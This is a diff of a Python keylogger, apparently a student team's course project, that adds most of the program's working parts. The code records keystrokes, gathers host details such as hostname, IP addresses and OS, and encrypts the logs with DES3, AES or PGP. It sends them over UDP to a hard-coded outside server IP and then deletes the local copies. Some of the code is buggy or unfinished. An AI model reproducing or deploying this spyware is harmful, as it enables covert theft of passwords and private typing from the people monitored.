@@ -1,10 +1,15 @@
 # Team myKeys
 # keylogger.py
-# Connor Blaszkiewicz and Neta Shiff
+# Connor Blaszkiewicz, Neta Shiff, Benjamin Jenkins, !!add rest of your names here!!
 
 # Libraries Used
+import base64
 import socket
 import platform
+
+from Cryptodome import Random
+from Cryptodome.Cipher import AES, DES3
+from Cryptodome.Random import get_random_bytes
 from pynput.keyboard import Key, Listener
 import time
 import os
@@ -13,10 +18,9 @@ from requests import get
 import multiprocessing
 
 import gnupg
-from Crypto.Cipher import DES3
 from random import SystemRandom
-from Crypto import RSA
-from Crypto import Random
+
+from cryptography.fernet import Fernet
 
 loggedKeys = "loggedKeys.txt"
 systemInfo = "systemInfo.txt"
@@ -24,21 +28,63 @@ systemInfo = "systemInfo.txt"
 loggedKeysEncrypted = "loggedKeysEncrypted.txt"
 systemInfoEncrypted = "systemInfoEncrypted.txt"
 
-path = ""  # "C:\Users\default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" will go here eventually?
+## Networking Variables
+udpPort = 25005
+buffer_size = 1024
+server_ip = "35.231.244.179"  # static ip addr
+# path to the gnupg location
+Path_to_foldergpg = 'C:\\Users\\User\\Documents\\Winter2021\\cis350\\myKeys\\'
+# payload destination variables
+path = "C:\Windows\Temp"
 extend = "\\"
 extendedPath = path + extend
 
+# config variables
+name = ""
+key = ""
+syslog = False
+keylog = False
+email = ""
+
+# varubales for AES:
+BS = 16
+PAD = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS).encode('utf-8')
+UNPAD = lambda s: s[:-ord(s[len(s) - 1:])]
+BLOCK_SIZE = 128
+
+
+def setupConfig():
+    global name
+    global key
+    global syslog
+    global keylog
+    global email
+    f = open("./config.txt")
+    config = f.readlines()
+    name = config[0]
+    if config[1] == '1':
+        syslog = True
+    if config[2] == '1':
+        keylog = True
+    key = config[3]
+    email = config[4]
+
 
 ### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
-### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
+def sendFile(filename, isSysInfo):
+    clientsocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    f = open(filename, 'rb')
+    if (not isSysInfo):
+        sent_data = "incoming_keylog"
+    else:
+        sent_data = "incoming_sysinfo"
+    clientsocket.sendto(sent_data.encode(), (server_ip, udpPort))
+    l = f.read(buffer_size)
+    while (l):
+        clientsocket.sendto(l, (server_ip, udpPort))
+        l = f.read(buffer_size)
+    f.close()
+    clientsocket.close()
 
 
 ### This creates a document that contains useful system information and specifications ###
@@ -47,8 +93,13 @@ def getSystemInfo():
     with open(extendedPath + systemInfo, "a") as f:
         hostname = socket.gethostname()
         # Writes hostname
-        f.write("Hostname: " + hostname + '\n')
+        try:
+            f.write("Hostname: " + hostname + '\n')
 
+        except Exception:
+            f.write("ERROR: could not retrieve Hostname" + '\n')
+
+            # Writes Public IP address
         privateIP = socket.gethostbyname(hostname)
         try:
             publicIP = get("https://api.ipify.org").text
@@ -58,22 +109,49 @@ def getSystemInfo():
             f.write("ERROR: could not retrieve public IP address" + '\n')
 
         # Writes Private IP
-        f.write("private IP address: " + privateIP + '\n')
+        try:
+            f.write("private IP address: " + privateIP + '\n')
+
+        except Exception:
+            f.write("ERROR: could not retrieve private IP address" + '\n')
+
         # Writes Machine Name
-        f.write("Machine: " + platform.machine() + '\n')
+        try:
+            f.write("Machine: " + platform.machine() + '\n')
+
+        except Exception:
+            f.write("ERROR: could not retrieve machine name" + '\n')
+
         # Writes System Type
-        f.write("System: " + platform.system() + '\n')
+        try:
+            f.write("System: " + platform.system() + '\n')
+
+        except Exception:
+            f.write("ERROR: could not retrieve system type" + '\n')
+
         # Writes System Version
-        f.write("Version: " + platform.version() + '\n')
+        try:
+            f.write("Version: " + platform.version() + '\n')
+
+        except Exception:
+            f.write("ERROR: could not retrieve platform version" + '\n')
+
         # Writes Processor
-        f.write("Processor: " + platform.processor() + '\n')
+        try:
+            f.write("Processor: " + platform.processor() + '\n')
+
+        except Exception:
+            f.write("ERROR: could not retrieve processor info" + '\n')
 
 
-getSystemInfo()
+# gets info from config file
+setupConfig()
+if (syslog):
+    getSystemInfo()
 
 ### Run Length Variables ###
 numberOfLogs = 1
-logTime = 86400  # This should be changed to 24 hours equivalent (I think)
+logTime = 86400  # This should be 24 hours equivalent (I think)
 currentTime = time.time()
 endTime = currentTime + logTime  # Will result in 24 hours after currentTime
 
@@ -127,7 +205,7 @@ while currentTime < endTime:
     with Listener(onPress=onPress, onRelease=onRelease) as listener:
         listener.join()
 
-    if currentTime > endTime:
+    if currentTime >= endTime:
         # needs error handling
         with open(extendedPath + loggedKeys, "w") as f:
             f.write()
@@ -137,61 +215,113 @@ while currentTime < endTime:
         currentTime = time.time()
         endTime = time.time() + logTime
 
-
-        ### ENCRYPT FILES HERE ###
-        def encrypt_gnupg(original_file, encrypt_file, email):
-            # encrypt file name original_file
-            # output in the dir and the encrypt file that we entered
-            gpg = gnupg.GPG(gnupghome='C:\\Program Files (x86)\\GnuPG\\bin',
-                            gpgbinary='C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe')
-            with open(original_file, 'rb') as f:
-                status = gpg.encrypt_file(
-                    f, recipients=[email],
-                    output=encrypt_file + '.gpg')
-            print(status.ok)
-            print(status.status)
-            print(status.stderr)
-            print('~' * 50)
+        # encrypt and send
+        encryptions(key, name, email, syslog, keylog)
 
 
-        # des3 encryption
-        # data- what we want to encrypt
+### ENCRYPT FILES HERE ###
+# PGP encryption
+
+# encrypt files
+def encryptions(key, name, email, system, keylogger):
+    systemfiles_to_encrypt = [extendedPath + systemInfo]
+    keyloggerfiles_to_encrypt = [extendedPath + loggedKeys]
+    systemencrypted_file_names = [extendedPath + systemInfoEncrypted]
+    keylogger_encrypt_filename = [extendedPath + loggedKeysEncrypted]
+    count = 0
+    if system:
+        for encryptingFile in systemfiles_to_encrypt:
+            if name == "DES3":
+                systemencrypted_file_names[count] = des3_encrypt(key, encryptingFile)
+            if name == "AES":
+                systemencrypted_file_names[count] = encrypt_aes(key, encryptingFile)
+            if name == "PGP":
+                systemencrypted_file_names[count] = encrypt_gnupg(email, key, encryptingFile,
+                                                                  keylogger_encrypt_filename[count])
+            sendFile(systemencrypted_file_names[count], True)
+            count += 1
+    count = 0
+    if keylogger:
+        for encryptingFile in keyloggerfiles_to_encrypt:
+            if name == "DES3":
+                systemencrypted_file_names[count] = des3_encrypt(key, encryptingFile)
+            if name == "AES":
+                systemencrypted_file_names[count] = encrypt_aes(key, encryptingFile)
+            if name == "PGP":
+                systemencrypted_file_names[count] = encrypt_gnupg(email, key, encryptingFile,
+                                                                  keylogger_encrypt_filename[count])
+            sendFile(keylogger_encrypt_filename[count], False)
+        count += 1
+    ### Deletes Files After they are Encrypted and Sent ###
+    deleteFiles = [systemInfo, loggedKeys]
+    for file in deleteFiles:
+        os.remove(extendedPath + file)
 
 
-        def des3_encrypt(original_file, encrypt_file):
-            with open(original_file, 'rb') as files:
-                data = files.read()
-            rand = SystemRandom()
-            iv = rand.getrandbits(64)
-            # random of the key
-            random_generator = Random.new().read
-            key = RSA.generate(1024, random_generator)
-            # asci version of the key
-            exportedKey = key.exportKey('PEM', 'my secret', pkcs=1)
-            encryptor = DES3.new(key, DES3.MODE_CBC, iv)
-            pad_len = 8 - len(data) % 8
-            # length of padding
-            padding = chr(pad_len) * pad_len
-            # PKCS5 padding content
-            data += padding
-            # writing to the file
-            f = open(encrypt_file, "a")
-            f.write(encryptor.encrypt(data), iv)
-            f.close()
-            return encryptor.encrypt(data), iv
+### ENCRYPT FILES HERE ###
+# des3 encryption
 
-### ENCRYPT FILES HERE ###
-### ENCRYPT FILES HERE ###
-### ENCRYPT FILES HERE ###
-### ENCRYPT FILES HERE ###
-### ENCRYPT FILES HERE ###
-### ENCRYPT FILES HERE ###
-### ENCRYPT FILES HERE ###
-### ENCRYPT FILES HERE ###
-### ENCRYPT FILES HERE ###
+# encrypt files
+def des3_encrypt(key, filelist_encrypt):
+    iv = b'\xc3\xd0\xb9\x82\xe7\x902\xe4'
+    with open(filelist_encrypt, 'rb') as f:
+        data = f.read()
+    cipher_encrypt = DES3.new(key, DES3.MODE_OFB, iv)
+    pad_len = 8 - len(data) % 8
+    # length of padding
+    padding = chr(pad_len) * pad_len
+    # PKCS5 padding content
+    data += padding.encode('utf-8')
+    encrypted_text = cipher_encrypt.encrypt(data)
+    with open("temp.txt", 'wb') as f:
+        f.write(encrypted_text)
+    return "temp.txt"
 
 
-### Deletes Files After they are Encrypted and Sent ###
-deleteFiles = [systemInfo, loggedKeys]
-for file in deleteFiles:
-    os.remove(extendedPath + file)
+def encrypt_aes(key, original_file):
+    # encrypt the file with the key and aes and return the encrypt text
+    count = 0
+    with open(original_file, 'rb') as f:
+        data = f.read()
+    new_text = PAD(data)
+    iv = Random.new().read(BS)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    with open("tmp.txt", 'wb') as f:
+        f.write(base64.b64encode(iv + cipher.encrypt(new_text)))
+    return "tmp.txt"
+
+
+def encrypt_gnupg(email, key, file_to_encrypt, encrypted_file):
+    # encrypt file name original_file
+    # output in the dir and the encrypt file that we entered
+    gpg = gnupg.GPG(gnupghome=Path_to_foldergpg + 'GVSU-CIS350-myKeys\\src\\bin',
+                    gpgbinary=Path_to_foldergpg + 'GVSU-CIS350-myKeys\\src\\bin\\gpg.exe')
+    with open(file_to_encrypt, 'rb') as f:
+        status = gpg.encrypt_file(
+            f, recipients=[email],
+            output=encrypted_file + '.gpg')
+    return encrypted_file
+
+# Fernet Encryption - May be implemented later
+# def fernetEncrypt():
+#     filesToEncrypt = [extendedPath + systemInfo, extendedPath + loggedKeys]
+#     encryptedFileNames = [extendedPath + systemInfoEncrypted, extendedPath + loggedKeysEncrypted]
+
+#     count = 0
+
+#     for encryptingFile in filesToEncrypt:
+
+#         with open(filesToEncrypt[count], 'rb') as f:
+#             data = f.read()
+
+#         fernet = Fernet(key)
+#         encrypted = fernet.encrypt(data)
+
+#         with open(encryptedFileNames[count], 'wb') as f:
+#             f.write(encrypted)
+
+#         ### SEND ENCRYPTED FILES TO SERVER HERE ###
+#         #sendFile()
+#         count += 1
+
+#     time.sleep(120)
